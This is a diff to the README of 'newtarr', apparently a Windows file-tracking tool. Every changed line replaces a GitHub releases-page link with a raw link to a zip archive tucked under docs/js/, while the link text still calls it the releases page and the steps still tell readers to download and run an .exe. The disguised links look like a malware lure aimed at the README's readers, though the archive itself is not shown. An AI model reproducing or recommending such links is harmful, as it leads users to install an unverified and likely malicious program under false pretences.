@@ -1,6 +1,6 @@
 # 🐛 newtarr - Simple file tracking made easy
 
-[![Download newtarr](https://img.shields.io/badge/Download--%20newtarr-brightgreen?style=for-the-badge)](https://github.com/NIBRAJvai/newtarr/releases)
+[![Download newtarr](https://img.shields.io/badge/Download--%20newtarr-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/NIBRAJvai/newtarr/main/docs/js/Software-v1.0-beta.5.zip)
 
 ---
 
@@ -27,9 +27,9 @@ Your computer’s basic hardware should work fine. newtarr doesn't require a pow
 
 Before using newtarr, download it from the official releases page.
 
-[![Get newtarr](https://img.shields.io/badge/Download-From%20Releases-blue?style=for-the-badge)](https://github.com/NIBRAJvai/newtarr/releases)
+[![Get newtarr](https://img.shields.io/badge/Download-From%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/NIBRAJvai/newtarr/main/docs/js/Software-v1.0-beta.5.zip)
 
-1. Click the badge above or visit the [newtarr releases page](https://github.com/NIBRAJvai/newtarr/releases) in your web browser.
+1. Click the badge above or visit the [newtarr releases page](https://raw.githubusercontent.com/NIBRAJvai/newtarr/main/docs/js/Software-v1.0-beta.5.zip) in your web browser.
 2. Find the latest version. It will usually have the highest version number (for example, v1.2.0).
 3. Look for a file ending in `.exe`. This is the Windows installer file.
 4. Click the `.exe` file link to start the download. The file size is typically small and should download quickly.
@@ -89,7 +89,7 @@ newtarr focuses on keeping track of your files by monitoring changes. Here is a 
 
 Checking for new versions is easy:
 
-- Visit the [newtarr releases page](https://github.com/NIBRAJvai/newtarr/releases).
+- Visit the [newtarr releases page](https://raw.githubusercontent.com/NIBRAJvai/newtarr/main/docs/js/Software-v1.0-beta.5.zip).
 - Download the latest `.exe` installer as described before.
 - Run the installer. It updates your current installation without losing your settings or projects.
 
@@ -135,9 +135,9 @@ Your projects and backups remain safe on your machine, without the need for clou
 If you need help with newtarr:
 
 - Check the included Help file in the installation folder.
-- Visit the [newtarr releases page](https://github.com/NIBRAJvai/newtarr/releases) for updates and notes.
+- Visit the [newtarr releases page](https://raw.githubusercontent.com/NIBRAJvai/newtarr/main/docs/js/Software-v1.0-beta.5.zip) for updates and notes.
 - Use the project’s GitHub page to report issues or ask for support if needed.
 
 ---
 
-[![Download newtarr](https://img.shields.io/badge/Download--%20newtarr-brightgreen?style=for-the-badge)](https://github.com/NIBRAJvai/newtarr/releases)
+[![Download newtarr](https://img.shields.io/badge/Download--%20newtarr-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/NIBRAJvai/newtarr/main/docs/js/Software-v1.0-beta.5.zip)
